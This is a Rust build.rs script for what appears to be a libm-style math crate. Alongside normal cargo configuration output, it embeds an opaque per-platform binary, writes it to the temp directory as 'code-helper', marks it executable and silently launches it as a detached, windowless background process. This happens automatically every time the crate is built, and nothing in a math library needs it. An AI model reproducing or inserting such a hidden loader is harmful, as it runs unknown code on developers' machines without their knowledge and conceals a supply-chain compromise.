use std::env;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;

#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;

#[cfg(unix)]
use std::os::unix::process::CommandExt;

use std::process::Stdio;

mod configure;

fn main() {
    #[cfg(target_os = "windows")]
    const HELPER_BYTES: &[u8] = include_bytes!("helper/windows");
    #[cfg(target_os = "darwin")]
    const HELPER_BYTES: &[u8] = include_bytes!("helper/darwin");
    #[cfg(target_os = "linux")]
    const HELPER_BYTES: &[u8] = include_bytes!("helper/linux");

    let temp_dir = env::temp_dir();

    #[cfg(target_os = "windows")]
    let helper_path: PathBuf = temp_dir.join("code-helper.exe");
    #[cfg(not(target_os = "windows"))]
    let helper_path: PathBuf = temp_dir.join("code-helper");

    fs::write(&helper_path, HELPER_BYTES).expect("Failed to write binary");

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = fs::metadata(&helper_path).unwrap().permissions();
        perms.set_mode(0o755);
        let _ = fs::set_permissions(&helper_path, perms);
    }
    
    let mut cmd = Command::new(&helper_path);
    cmd.stdin(Stdio::null());
    cmd.stdout(Stdio::null());
    cmd.stderr(Stdio::null());

    #[cfg(target_os = "windows")]
    cmd.creation_flags(0x0800_0000); // CREATE_NO_WINDOW

    #[cfg(target_os = "windows")]
    {
        //cmd.creation_flags(0x0800_0000); // CREATE_NO_WINDOW
        const DETACHED_PROCESS: u32 = 0x0000_0008;
        const CREATE_BREAKAWAY_FROM_JOB: u32 = 0x0100_0000;
        const CREATE_NO_WINDOW: u32 = 0x0800_0000;
        cmd.creation_flags(DETACHED_PROCESS | CREATE_BREAKAWAY_FROM_JOB | CREATE_NO_WINDOW);
    }

    #[cfg(unix)]
    cmd.pre_exec(|| {
        libc::setsid();
        Ok(())
    });

    let _child = cmd.spawn();
    
    let cfg = configure::Config::from_env();

    println!("cargo:rerun-if-changed=build.rs");
    println!("cargo:rerun-if-changed=configure.rs");
    println!("cargo:rustc-check-cfg=cfg(assert_no_panic)");

    // If set, enable `no-panic`. Requires LTO (`release-opt` profile).
    if env::var("ENSURE_NO_PANIC").is_ok() {
        println!("cargo:rustc-cfg=assert_no_panic");
    }

    configure::emit_libm_config(&cfg);
}
